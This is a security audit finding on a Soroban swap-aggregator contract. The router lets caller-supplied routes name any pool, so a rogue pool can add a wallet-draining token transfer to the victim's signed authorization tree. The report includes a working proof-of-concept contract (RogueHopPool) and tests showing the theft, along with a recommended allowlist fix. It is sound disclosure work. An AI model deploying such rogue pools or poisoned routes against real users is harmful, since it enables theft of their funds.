### Title
Attacker-supplied swap route names arbitrary pool addresses, and a rogue pool can inject a wallet-draining token `transfer` into the caller's signed authorization tree - (File: contracts/swap-aggregator/src/execute/mod.rs)

### Summary
The `execute_strategy` router dispatches each hop to whatever `pool`/`token` addresses the caller-supplied `StrategyPayload` names, keeping no venue or pool allowlist. Because a hop pool runs as a child of the caller's top-level `require_auth`, a malicious pool can call `token.transfer(victim, attacker, amount)` on any unrelated wallet token; the Stellar host records that call as a child of the victim's own `swap_collateral` / `execute_strategy` auth entry, and an honest `simulateTransaction` returns it in the tree the wallet is asked to sign. This is the on-chain analog of command injection: attacker-controlled data (route bytes) is interpreted as instructions executing with the signer's authority, escaping the intended single input-transfer grant.

### Finding Description
`execute_op` builds each `SwapHop` purely from payload registry indices (`pool`, `token_in`, `token_out`) with no validation against any allowlist, and `venues::dispatch_hop` invokes that address. [1](#0-0)  The only authorization in `run` is `sender.require_auth()`, so any contract the route names executes below the sender's auth frame and can request `require_auth` on the sender for arbitrary token transfers. [2](#0-1)  The threat model documents this exactly: "a route can put third-party code on the call stack below the caller's authorization... The loss is then the caller's wallet, not the routed amount." [3](#0-2)  The harness test proves it: `RogueHopPool::swap` calls `transfer(alice, attacker, WALLET_BALANCE)` during a `swap_collateral`, simulation records the theft as a child of Alice's entry, and signing that tree moves her full wallet balance while delivering a fair swap output so every protocol check passes. [4](#0-3) [5](#0-4) 

The controller's own router calls are safe — the controller grants exactly one input-transfer auth and is `sender` — but the direct `execute_strategy` path exposes every caller, and user-facing controller strategies (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`) pass caller-supplied `swap` bytes straight into `router.execute_strategy`. [6](#0-5) 

### Impact Explanation
Theft of user funds: the entire balance of every token in the victim's wallet can be pulled in one transaction, unbounded by `total_in`, `min_out`, or the final risk gate. The swap itself can return a perfectly fair output, so no on-chain slippage, delta, or residual check fires; the only defense is the client decoding the signed auth tree and refusing extra children, which is an off-chain convention, not an enforcement.

### Likelihood Explanation
Exploitation requires the victim to sign a simulated auth tree containing the rogue child. This is realistic: routes come from an off-chain quote service or are pasted by users, and wallets display auth trees poorly if at all. Any party that can feed route bytes to a user (malicious quote endpoint, phishing frontend, manipulated route-sharing) can weaponize it with no privileges and no capital. The attack scales to every user of the router and needs no protocol state setup.

### Recommendation
Enforce on-chain that route-specified addresses cannot request the sender's auth: the cleanest fix is a venue/pool allowlist maintained by the router owner (checking `hop.pool` and hop tokens at dispatch). Alternatively, execute venue hops through an intermediate contract that holds the funds, so the sender's auth frame is never on the call stack below route-named code. Document that clients must reject any auth tree whose children exceed the single expected `token_in.transfer(sender, router, total_in)` entry — the test file already demonstrates the check.

### Proof of Concept
Existing test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a complete PoC: a `RogueHopPool` deployed with a `(victim, wallet_token, attacker, amount)` plan performs `token.transfer(victim, attacker, amount)` inside its `swap` hop; simulation records the theft nested under the victim's `swap_collateral` root; signing the recorded tree drains `WALLET_BALANCE` to the attacker while Alice still receives `FAIR_OUT_ETH` and the position remains healthy. [7](#0-6) [8](#0-7)

### Citations

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-85)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();

    if total_in <= 0 {
        panic_with_error!(&env, Error::InvalidAmount);
    }

    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

    let input_token = assets.get_unchecked(program.token_in);
    let output_token = assets.get_unchecked(program.token_out);
    let total_min_out = amounts.get_unchecked(program.min_out);
    if total_min_out <= 0 {
        panic_with_error!(&env, Error::SlippageExceeded);
    }

    let router = env.current_contract_address();
    let mut vault = Vault::new(&env);
    let mut tokens_cache: Map<Address, Vec<Address>> = Map::new(&env);

    // Credit the measured delta, not declared `total_in`: a fee-on-transfer
    // input would otherwise draw the shortfall from the fee reserve.
    let credited_in = transfer_amount_measured(
        &env,
        &input_token,
        &sender,
        &router,
        total_in,
        GenericError::AmountMustBePositive,
    );
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-165)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-72)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```
